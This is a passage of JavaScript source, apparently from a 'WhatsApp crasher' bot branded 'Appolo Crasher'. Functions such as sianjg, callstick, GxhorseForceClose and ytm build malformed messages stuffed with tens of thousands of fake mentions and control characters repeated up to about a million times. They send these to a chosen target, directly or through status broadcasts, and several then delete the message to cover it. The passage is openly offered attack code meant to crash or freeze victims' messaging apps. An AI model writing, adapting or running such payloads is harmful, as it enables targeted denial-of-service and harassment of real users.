                      { name: "cancel_payment", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "buy_now", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "view_details", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "next_page", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "payment_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "call_permission_request", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "mpm", buttonParamsJson: "x" },
                      { name: "mpm", buttonParamsJson: "x" }
                    ]
                  }
                }
              ]
            }
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            isForwarded: true,
            hasMediaAttachment: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
            externalAdReply: {
              title: "Appolo Crasher",
              body: "Since 2025 🩸",
              thumbnailUrl: "",
              thumbnail: null,
              mediaType: 1,
              mediaUrl: "https://t.me/SilentMoop",
              sourceUrl: "https://t.me/SilentMoop",
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Sent", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AppoloDownFall🍂 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@SilentMoop\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 🏴 ⿻ 🩸 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }, {});

    await client.relayMessage(target, message.message, {
      messageId: message.key.id
    });

  } catch (err) {
    console.error("Error sianjg:", err);
  }
}
*/
async function sianjg(target, ptcp = true) {
  try {
    const Node = [
      {
        tag: "bot",
        attrs: {
          biz_bot: "1"
        }
      }
    ];

    const message = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stanzaId: "AppoloSike",
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "X" },
              footer: { text: "X" },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      text: "🩸 appolo sincê #2024",
                      imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      fileLength: "164089",
                      height: 1,
                      width: 1,
                      mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1749172037",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                      scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                      scanLengths: [8596, 155493]
                      },
                      hasMediaAttachment: true
                    },
                    body: { text: "🩸 appolo sincê #2024" },
                    footer: { text: "🍁 Appolo Crasher #Since2025 🩸" },
                    nativeFlowMessage: {
                      messageParamsJson: '🩸Appolo #since2025',
                      buttons: [
                        { name: "report_issue", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "payment_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "redeem_code", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "shipping_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "rate_experience", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "help_center", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "cancel_payment", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "buy_now", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "view_details", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "next_page", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "payment_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "call_permission_request", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                        { name: "mpm", buttonParamsJson: "x" },
                        { name: "mpm", buttonParamsJson: "x" }
                      ]
                    }
                  }
                ]
              }
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              isForwarded: true,
              hasMediaAttachment: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net"
              },
              externalAdReply: {
                title: "Appolo Crasher",
                body: "Since 2025 🩸",
                thumbnailUrl: "",
                thumbnail: null,
                mediaType: 1,
                mediaUrl: "https://t.me/SilentMoop",
                sourceUrl: "https://t.me/SilentMoop"
              },
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "Sent", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                      paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AppoloDownFall🍂 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@SilentMoop\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 🏴 ⿻ 🩸 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
                      }
                    }
                  }
                }
              },
              remoteJid: "@s.whatsapp.net"
            }
          }
        }
      },
      {
        disappearingMode: {
          initiator: "INITIATED_BY_OTHER",
          trigger: "ACCOUNT_SETTING"
        },
        additionalNodes: Node
      }
    );

    await client.relayMessage(target, message.message, {
      messageId: message.key.id
    });

    await client.deleteMessage(target, {
      remoteJid: target,
      fromMe: true,
      id: message.key.id
    });
  } catch (err) {
    console.error("Error sianjg:", err);
  }
}

/*
async function XZ(target) {
  const msg = await generateWAMessageFromContent(target, {
  ephemeralMessage: {
    viewOnceMessage: {
      message: { 
        interactiveMessage: {
          body: { 
            text: 'X' 
          },
          footer: { 
            text: 'X' 
          },
          carouselMessage: {
            cards: [
              {               
            header: {
              text: "🩸 appolo sincê #2024",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                fileLength: "164089",
                height: 1,
                width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "🩸 appolo sincê #2024"
                },
                footer: {
                  text: "🍁 Appolo Crasher #Since2025 🩸"
                },
nativeFlowMessage: {
messageParamsJson: '🩸Appolo #since2025',
buttons: [
{
name: "report_issue",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "redeem_code",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "shipping_info",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "rate_experience",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "help_center",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "cancel_payment",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "buy_now",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "view_details",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "next_page",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "payment_info",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "call_permission_request",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
{
name: "mpm",
buttonParamsJson: "x"
},
{
name: "mpm",
buttonParamsJson: "x"
}
]
}
}
]
}
},
          contextInfo: {
            participant: target,
mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
              ],
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson:`{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AppoloDownFall🍂 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@SilentMoop\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 🏴󠁧󠁢󠁷󠁬󠁳󠁿 ⿻ 🩸 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                      version: 3
                  }
                }
              }
            }
          },
          remoteJid: target
          }
       }
    }
  }
 }
});
  
 await client.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  await client.deleteMessage(target, {
    id: msg.key.id,
    fromMe: true,
    remoteJid: target
  });

  return msg.key;
}
/*
async function InvisCursor(target, z) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: 'X'
          },
          footer: { 
            text: 'X' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  text: "🩸 appolo sincê #2024",
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧"
                },
                footer: {
                  text: "null.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "X"
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,           
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ null.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast",
          }
        }
      }
    }
  }, {});

  await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

let type = m.chat ? 'statusMentionMessage' : 'groupStatusMentionMessage';

  if (z) {
    await client.relayMessage(target, {
      [type]: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 15
          }
        }
      }
    }, {});
  }
}*/

async function callstick(target) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: true,
          viewOnce: true,
          contextInfo: {
            mentionedJid: [
              "696969696969@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, generateMessage, {});
  msg.key = {
    remoteJid: 'status@broadcast',
    fromMe: true,
    id: generateMessageID()
  };

  // Kirim pesan ke status@broadcast
  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  // LANGSUNG hapus status tanpa delay
  await client.deleteMessage("status@broadcast", {
    id: msg.key.id,
    fromMe: true,
    remoteJid: "status@broadcast"
  });
}

function generateMessageID() {
  return Math.random().toString(36).substring(2, 10) + Date.now();
}
async function GxhorseForceClose(target) {
  for (let r = 0; r < 1; r++) {
    let msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "X",
                mentionedJid: [target],
                forwardedNewsletterMessageInfo: {
                  newsletterName: "Appolo The Fall 🍂",
                  newsletterJid: "120363321780343299@newsletter",
                  serverMessageId: 1
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: "Appolo The Fall 🍂",
                  body: "",
                  thumbnailUrl: null,
                  sourceUrl: "t.me/SilentMoop",
                  mediaType: 1,
                  renderLargerThumbnail: true
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
                dataSharingContext: {
                  showMmDisclosure: true,
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                  }
                }
              },
              header: {
                title: "AppoloTheGreate",
                hasMediaAttachment: false
              },
              body: {
                text: "AppoloTheGreat 🍂",
              },
              nativeFlowMessage: {
messageParamsJson: "{\"name\":\"shipping_info\",\"title\":\"Shipping Info\",\"header\":\"Track Package\",\"body\":\"Your item is on the way 📦\"}",
                buttons: [
{
name: "report_issue",
buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
},
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                      data: "\u0007".repeat(3000),
                      status: "\u0007".repeat(3000)
                    })
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: JSON.stringify({
                      data: "\u0007".repeat(3000),
                      status: "\u0007".repeat(3000)
                    })
                  },
                  {
                    name: "payment_status",
                    buttonParamsJson: JSON.stringify({
                      data: "\u0007".repeat(3000),
                      status: "\u0007".repeat(3000)
                    })
                  },
                  {
                    name: "shipping_info",
                    buttonParamsJson: JSON.stringify({
                      data: "\u0007".repeat(3000),
                      status: "\u0007".repeat(3000)
                    })
                  },
                  {
                    name: "payment_Info",
                    buttonParamsJson: JSON.stringify({
                      data: "\u0007".repeat(3000),
                      status: "\u0007".repeat(3000)
                    })
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );
    await client.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    console.log("Succes Sending Bugs");
  }
}

async function ytm(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {
                header: {
                  text: "🩸 appolo sincê #2024",
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true
                },
                body: { text: "🩸 appolo sincê #2024" },
                footer: { text: "sex.json" },
                nativeFlowMessage: {
                  messageParamsJson: '🩸Appolo #since2025',
                  buttons: [
                    {
                      name: "payment_info",
                      buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸"
                    }
                  ]
                }
              }
            ]
          }
        }
      }
    }
  }, {});

  // Tambahan properti visual
  msg.message.viewOnceMessage.message.interactiveMessage.ephemeralExpiration = 0;
  msg.message.viewOnceMessage.message.interactiveMessage.forwardingScore = 0;
  msg.message.viewOnceMessage.message.interactiveMessage.isForwarded = false;
  msg.message.viewOnceMessage.message.interactiveMessage.font = Math.floor(Math.random() * 9);
  msg.message.viewOnceMessage.message.interactiveMessage.background =
    "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");

  // Kirim ke status broadcast
  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  let type = target.endsWith("@g.us") ? 'groupStatusMentionMessage' : 'statusMentionMessage';

  await client.relayMessage(target, {
    [type]: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {});
}
async function CursorCrLv2(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '@appoloCrasher • #Since2025 🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD..."
                  }
                },
                nativeFlowInfo: {
                  name: "call_permission_request",
                  buttonParamsJson: ""
                }
              }
            ]
          }
        }
      }
    }
  });

  await client.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function hayuk(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
